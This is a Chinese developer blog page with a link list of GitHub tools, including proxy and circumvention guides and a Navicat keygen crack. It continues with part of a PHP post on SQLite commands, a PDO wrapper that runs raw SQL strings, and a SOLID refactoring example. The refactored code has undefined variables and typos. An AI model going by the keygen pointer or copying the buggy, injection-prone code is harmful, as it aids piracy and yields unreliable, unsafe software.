<p><a href="https://github.com/xianyucoder/Crack-JS" target="_blank" rel="noopener">Python3爬虫项目进阶实战、JS加解密</a></p>
<p>定投改变命运 —— 让时间陪你慢慢变富 <a href="https://github.com/xiaolai/regular-investing-in-box" target="_blank" rel="noopener">https://github.com/xiaolai/regular-investing-in-box</a></p>
<p>蚂蚁森林能量智能收取脚本 (基于Auto.js)<a href="https://github.com/SuperMonster003/Auto.js_Projects/tree/Ant_Forest" target="_blank" rel="noopener">https://github.com/SuperMonster003/Auto.js_Projects/tree/Ant_Forest</a></p>
<p>文章多平台发布工具:AutoPublish，目前支持知乎、CSDN、豆瓣日志 <a href="https://github.com/ayuliao/Autopublish" target="_blank" rel="noopener">https://github.com/ayuliao/Autopublish</a></p>
<p> <a href="https://github.com/zzjzz9266a/91porn_php" target="_blank" rel="noopener">91porn爬虫php版本</a></p>
<p><a href="https://github.com/arnofeng/ngx_google_deployment" target="_blank" rel="noopener"> 一键反代谷歌和谷歌学术</a></p>
<p><a href="https://github.com/Michael728/awesome-tools-resources" target="_blank" rel="noopener">分享发现的好资源，好工具</a></p>
<p><a href="https://github.com/ofcold/desktop-pictures" target="_blank" rel="noopener">桌面壁纸分享</a></p>
<p><a href="https://github.com/jaywcjlove/handbook" target="_blank" rel="noopener">笔记/搜集/摘录/实践</a></p>
<p><a href="https://github.com/selfteaching/the-craft-of-selfteaching" target="_blank" rel="noopener">李笑来的新书《自学是门手艺》发布了</a></p>
<p><a href="https://github.com/jinfagang/tensorflow_poems" target="_blank" rel="noopener">中文古诗自动作诗机器人</a></p>
<p><a href="https://github.com/lawvs/buddy-github-events" target="_blank" rel="noopener">偷看大佬们的 GitHub 动态</a></p>
<p><a href="https://github.com/0123cf/auto-layout" target="_blank" rel="noopener">开源可视化布局项目</a></p>
<p><a href="https://github.com/EtherDream/jsproxy/" target="_blank" rel="noopener">Google代理</a></p>
<p><a href="https://zhaodao.ai/" target="_blank" rel="noopener">找到你喜爱的作品</a></p>
<p><a href="https://github.com/36huo/wechat_anti_revoke/" target="_blank" rel="noopener">微信 PC 2.6.8.37 防撤回补丁</a></p>
<p><a href="https://unsplash.com/" target="_blank" rel="noopener">无版权图片</a></p>
<p><a href="https://github.com/vinta/pangu.js" target="_blank" rel="noopener">加空格</a></p>
<p><a href="https://github.com/TIM168/technical_books" target="_blank" rel="noopener"> IT 互联网书籍</a></p>
<p><a href="https://github.com/ruanyf/simple-bash-scripts" target="_blank" rel="noopener">A collection of simple Bash scripts</a></p>
<p><a href="https://segmentfault.com/a/1190000019239788" target="_blank" rel="noopener">Python爬虫例子之QQ历史报告</a></p>
<p><a href="https://coding.net/u/lunayj/p/developer-pray-codeImg/git" target="_blank" rel="noopener">程序猿专用保佑 注释代码 ascii图像</a></p>
<p><a href="https://github.com/CraryPrimitiveMan/awesome-php-zh_CN" target="_blank" rel="noopener">一个PHP资源列表，内容包括：库、框架、模板、安全</a></p>
<p><a href="https://github.com/epety/100-shell-script-examples" target="_blank" rel="noopener">Collection of shell scripts found on the internet</a></p>
<p><a href="https://github.com/jaywcjlove/github-rank" target="_blank" rel="noopener">sf GitHub 开发者热门 https://wangchujiang.com/github-rank/sifou-daily.html</a></p>
<p><a href="https://github.com/nick233333/phper-linux-gitbook" target="_blank" rel="noopener">PHPer 必知必会的 Linux 命令 https://linux.hellocode.name/</a></p>
<p><a href="https://github.com/sqc157400661/XiaoTShop" target="_blank" rel="noopener">laravel5.5搭建的后台管理 和 api服务 的小程序商城</a></p>
<p><a href="https://github.com/rrweb-io" target="_blank" rel="noopener">录制并回放任意 web 界面中的用户操作</a></p>
<p><a href="https://github.com/2016rshah/githubchart-api" target="_blank" rel="noopener">Github贡献图表作为图像</a></p>
<p><a href="https://github.com/ecmadao/hacknical" target="_blank" rel="noopener">可视化 GitHub 简历</a></p>
<p><a href="https://www.codeku.me/archives/3031.html" target="_blank" rel="noopener">反向代理 GitHubgreasyfork.org/zh-CN/scripts/383577</a></p>
<p><a href="https://github.com/ccxt/ccxt" target="_blank" rel="noopener">数字货币交易api https://learnku.com/articles/28049#replies</a></p>
<p><a href="https://github.com/aoxiang594/laravel-province-city-area" target="_blank" rel="noopener">省市区县乡镇街道 自带爬虫</a></p>
<p><a href="https://github.com/byrwiki/byrwiki/issues/13" target="_blank" rel="noopener">科学上网办法科普</a></p>
<p><a href="https://github.com/wi1dcard/china-divisions" target="_blank" rel="noopener">中国行政区划地址库</a></p>
<p><a href="https://github.com/mylxsw/growing-up" target="_blank" rel="noopener">程序猿成长计划</a></p>
<p><a href="https://github.com/phobal/ivideo" target="_blank" rel="noopener">观看国内主流视频平台所有视频的客户端</a></p>
<p><a href="https://github.com/guanguans/soar-php" target="_blank" rel="noopener">SQL 语句优化器和重写器</a></p>
<p><a href="https://github.com/52cik/github-hans" target="_blank" rel="noopener">GitHub 汉化插件</a></p>
<p><a href="https://github.com/Deltafox79/Navicat_Keygen" target="_blank" rel="noopener">Navicat_Keygen破解</a></p>
<p><a href="https://github.com/zzjzz9266a/91porn_php" target="_blank" rel="noopener">91porn爬虫php版本</a></p>
<p><a href="https://github.com/henrylee2cn/pholcus_lib" target="_blank" rel="noopener">公共维护的Pholcus爬虫规则库</a></p>
<p><a href="https://github.com/nondanee/UnblockNeteaseMusic" target="_blank" rel="noopener">解锁网易云音乐客户端变灰歌曲</a></p>
<p><a href="https://github.com/hacklcx/HFish" target="_blank" rel="noopener">企业安全测试主动攻击型蜜罐钓鱼框架系统</a></p>
<p>爱国守法，科学上网google <a href="https://github.com/zhouaini528/scientific_internet_access" target="_blank" rel="noopener">https://github.com/zhouaini528/scientific_internet_access</a></p>
<p> 内部API的安全防护怎么搞？密码学中有答案 <a href="https://ksloveyuan.github.io/posts/api_security/" target="_blank" rel="noopener">https://ksloveyuan.github.io/posts/api_security/</a></p>
<p>文章多平台发布工具:AutoPublish，目前支持知乎、CSDN、豆瓣日志 <a href="https://github.com/ayuliao/Autopublish" target="_blank" rel="noopener">https://github.com/ayuliao/Autopublish</a></p>
<p>蚂蚁森林能量智能收取脚本 (基于Auto.js)<a href="https://github.com/SuperMonster003/Auto.js_Projects/tree/Ant_Forest" target="_blank" rel="noopener">https://github.com/SuperMonster003/Auto.js_Projects/tree/Ant_Forest</a></p>
<p>POLAR 是一个强大的跨平台（Mac、Window、Linux）文档管理系统，它能够离线缓存网页内容、PDF 电子书和笔记。支持标签管理、添加注解、高亮内容（网页、PDF），记录阅读进度。<a href="https://github.com/burtonator/polar-bookshelf" target="_blank" rel="noopener">https://github.com/burtonator/polar-bookshelf</a></p>
<p>如何搭建v2ray，放弃使用ss和ssr <a href="https://viencoding.com/article/207" target="_blank" rel="noopener">https://viencoding.com/article/207</a></p>
<p>你在 GitHub 上看到过的最有意思的项目是什么 <a href="https://www.zhihu.com/question/23498424/answer/353063346" target="_blank" rel="noopener">https://www.zhihu.com/question/23498424/answer/353063346</a></p>
<p> 《科学上网翻墙教程》阅读地址：<a href="https://darrenliuwei.coding.me/fuck-gfw" target="_blank" rel="noopener">https://darrenliuwei.coding.me/fuck-gfw</a> <a href="https://github.com/fanqiangdang/fuck-gfw" target="_blank" rel="noopener">https://github.com/fanqiangdang/fuck-gfw</a></p>
<p>备份微信、微博等平台被删文章 <a href="https://github.com/Terminus2049/Terminus2049.github.io" target="_blank" rel="noopener">https://github.com/Terminus2049/Terminus2049.github.io</a></p>
<p>爱国守法，科学上网google <a href="https://github.com/zhouaini528/scientific_internet_access" target="_blank" rel="noopener">https://github.com/zhouaini528/scientific_internet_access</a></p>
<p>完美重现九神《囤比特币：寻找合适的够买时机》 <a href="https://github.com/Ksloveyuan/btc_price_analyzer" target="_blank" rel="noopener">https://github.com/Ksloveyuan/btc_price_analyzer</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/13/php-记录/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/13/php-记录/" itemprop="url">php 记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-13T10:34:43+08:00">
                2019-05-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  19.5k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  94 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="php-sqlite"><a href="#php-sqlite" class="headerlink" title="php sqlite"></a>php sqlite</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"># -- 查询当前数据库信息</span><br><span class="line">sqlite&gt; .database</span><br><span class="line"></span><br><span class="line"># -- 查询当前数据库下的所有表的信息</span><br><span class="line"># 可选参数 ? table name , 如果加上这个参数, 会按照输入的表面去显示, 支持 LIKE 方式查找</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">sqlite&gt; .tables %persion%</span><br><span class="line"></span><br><span class="line"># -- 创建一个表</span><br><span class="line">sqlite&gt; CREATE TABLE persions (</span><br><span class="line">        id INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">        name text,</span><br><span class="line">        age int);</span><br><span class="line"></span><br><span class="line"># -- 删除一个表</span><br><span class="line">sqlite&gt; drop table persions;</span><br><span class="line"></span><br><span class="line"># -- 修改表名</span><br><span class="line">sqlite&gt; ALTER TABLE persions RENAME TO persions2;</span><br><span class="line"># 查看修改结果</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line"># 再改回去,不要影响后面的命令</span><br><span class="line">sqlite&gt; ALTER TABLE persions2 RENAME TO persions;</span><br><span class="line"></span><br><span class="line"># -- 查看表结构</span><br><span class="line">sqlite&gt; pragma table_info (<span class="string">'persions'</span>);</span><br><span class="line"></span><br><span class="line"># -- 修改字段, SQLite 不能像主流数据库那样直接修改字段, 只能添加一个新的字段</span><br><span class="line">#    如果必须要修改,可以先将表重命名一个其他的,再将数据插入即可</span><br><span class="line"># 添加新字段</span><br><span class="line">sqlite&gt; ALTER TABLE persions ADD COLUMN address text;</span><br><span class="line"></span><br><span class="line"># -- 添加数据, 规则和 MYSQL 很类似</span><br><span class="line"># 方式1</span><br><span class="line">sqlite&gt; INSERT INTO persions(name,age,address) VALUES (<span class="string">'张三'</span>,<span class="number">25</span>,<span class="string">'北京'</span>);</span><br><span class="line"># 方式2 不推荐,如果使用这种方式, 就要字段和表的字段数量完全相同</span><br><span class="line">sqlite&gt; INSERT INTO persions VALUES (<span class="number">2</span>,<span class="string">'李四'</span>,<span class="number">30</span>,<span class="string">'天津'</span>);</span><br><span class="line"># 方式3 一般不会用,向表中插入默认值,如果没有指定默认值,就写入 NULL</span><br><span class="line">sqlite&gt; INSERT INTO persions DEFAULT VALUES;</span><br><span class="line"></span><br><span class="line"># -- 更新数据</span><br><span class="line">sqlite&gt; UPDATE persions SET name=<span class="string">'李四'</span>,age=<span class="number">22</span>,address=<span class="string">'上海'</span> WHERE id=<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"># -- 查询数据</span><br><span class="line">sqlite&gt; SELECT id,name,age,address FROM persions;</span><br><span class="line"></span><br><span class="line"># -- 删除数据</span><br><span class="line">sqlite&gt; DELETE FROM persions WHERE id=<span class="number">3</span>;</span><br><span class="line"><span class="comment">// 创建一个专门处理 SQLite 的 PDO类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sqlite</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $pdo;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$pdo = null</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 创建 PDO_SQLITE DSN</span></span><br><span class="line">        <span class="keyword">if</span> ($pdo) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;pdo = $pdo;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;pdo = <span class="keyword">new</span> PDO(<span class="string">'sqlite:/home/bro/www/temp/test.sq3'</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">                echo <span class="string">'数据库连接失败: '</span> . $e-&gt;getMessage();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 测试的时候将错误提示打开,否则出错了不清楚怎么回事</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;pdo-&gt;setAttribute($<span class="keyword">this</span>-&gt;pdo::ATTR_ERRMODE, $<span class="keyword">this</span>-&gt;pdo::ERRMODE_EXCEPTION);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询所有数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">fetchAll</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;pdo-&gt;query($sql)-&gt;fetchAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 插入一条数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">insertOneData</span>(<span class="params">$sql</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;pdo-&gt;prepare($sql)-&gt;execute();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 定义一个打印结果的函数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params">$val, $title = null</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($title) &#123;</span><br><span class="line">        echo <span class="string">"&lt;br&gt;&lt;br&gt;&lt;h3&gt;&#123;$title&#125;&lt;/h3&gt;&lt;hr&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    echo <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">    var_dump($val);</span><br><span class="line">    echo <span class="string">'&lt;/pre&gt;&lt;hr&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sqlite = <span class="keyword">new</span> Sqlite; <span class="comment">//new 一个Sqlite对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询所有数据https://broqiang.com/posts/linux-php-sqlite</span></span><br><span class="line">$sqlQueryAll = <span class="string">"select * from persions"</span>;</span><br><span class="line"></span><br><span class="line">$allData = $sqlite-&gt;fetchAll($sqlQueryAll);</span><br><span class="line"></span><br><span class="line">p($allData,<span class="string">'所有查询结果'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入一条数据</span></span><br><span class="line">$sqlInsertOneData = sprintf(<span class="string">"INSERT INTO persions(name,age,address) VALUES ('%s',%d,'%s');"</span>,<span class="string">'张三'</span>,<span class="number">25</span>,<span class="string">'北京'</span>);</span><br><span class="line"></span><br><span class="line">p($sqlite-&gt;insertOneData($sqlInsertOneData) ? <span class="string">'插入成功'</span> : <span class="string">'插入失败'</span>,<span class="string">'插入一条数据'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="S-O-I-L-D-之单一职责"><a href="#S-O-I-L-D-之单一职责" class="headerlink" title="S.O.I.L.D 之单一职责"></a>S.O.I.L.D 之单一职责</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Acme\Reporting;</span><br><span class="line"></span><br><span class="line">use Auth;</span><br><span class="line">use DB;</span><br><span class="line">use Exception;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SalesReporter</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取某个时间段的销售总额</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param  $startDate</span></span><br><span class="line"><span class="comment">     * @param  $endDate  </span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @return string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">between</span>(<span class="params">$startDate, $endDate</span>) : <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! Auth::check()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">'Authentication required for reporting'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $sales = $<span class="keyword">this</span>-&gt;queryDBForSalesBetween($startDate, $endDate);</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;format($sales);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询销售报表数据</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param  $startDate </span></span><br><span class="line"><span class="comment">     * @param  $endDate  </span></span><br><span class="line"><span class="comment">     *  </span></span><br><span class="line"><span class="comment">     * @return float         </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">queryDBForSalesBetween</span>(<span class="params">$startDate, $endDate</span>) : <span class="title">float</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> DB::table(<span class="string">'sales'</span>)-&gt;whereBetween(<span class="string">'created_at'</span>, [$startDate, $endDate])-&gt;sum(<span class="string">'charge'</span>) / <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 数据展示</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param  $sales</span></span><br><span class="line"><span class="comment">     * @return string     </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params">$sales</span>) : <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&lt;h1&gt;Sales: $sales&lt;/h1&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">测试</span><br><span class="line"></span><br><span class="line">$report = <span class="keyword">new</span> Acme\Reporting\SalesReporter();</span><br><span class="line">$report-&gt;between(</span><br><span class="line">    now()-&gt;subDays(<span class="number">10</span>), </span><br><span class="line">    now()</span><br><span class="line">);</span><br><span class="line">该例子明显违反了单一职责:</span><br><span class="line"></span><br><span class="line">授权方式发生变化时，如 API 授权，需要改动该类</span><br><span class="line">当数据库层发生变化时候，如使用 Redis 时，需要改动该类</span><br><span class="line">当展示方式发生变化时，需要改动该类</span><br><span class="line">正面示例</span><br><span class="line"></span><br><span class="line">对于上述的例子，应当作出如下的改动：</span><br><span class="line"></span><br><span class="line">不需要关心用户授权，用户授权与本类的职责无关</span><br><span class="line">数据层应当剥离出来</span><br><span class="line">展示层应当剥离出来</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment">// 展示层接口</span></span><br><span class="line">interface SalesOutputInterface &#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">// 展示层实现</span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">HtmlOutput</span> <span class="title">implements</span> <span class="title">SalesOutputInterface</span> </span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$sales</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;h1&gt;&#123;$sales&#125;&lt;/h1&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据层</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SalesRepository</span> </span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">between</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> DB::table(<span class="string">'sales'</span>)-&gt;whereBetween(<span class="string">'create_at'</span>, [$startDate, $endDate])-&gt;sum(<span class="string">'charge'</span>) / <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 职责类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SalsReporter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    public $repo;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$repo</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;repo = $repo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">between</span>(<span class="params">$startDate, $endDate, SalesOutputInterface $formater</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $sales = $<span class="keyword">this</span>-&gt;repo-&gt;between($startDate, $endDate);</span><br><span class="line">        $formater-&gt;output($sales);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">测试</span><br><span class="line"></span><br><span class="line">$report = <span class="keyword">new</span> SalsReporter(<span class="keyword">new</span> SalesRepository);</span><br><span class="line">$report-&gt;between(</span><br><span class="line">    now-&gt;subDays(<span class="number">10</span>), </span><br><span class="line">    now(),</span><br><span class="line">    <span class="keyword">new</span> HtmlOutput</span><br><span class="line">);</span><br><span class="line">结合 Laravel 的依赖注入，可以进一步简化https:<span class="comment">//learnku.com/articles/27923#topnav</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SalsReporter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    public $repo;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">SalesRepository $repo</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;repo = $repo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    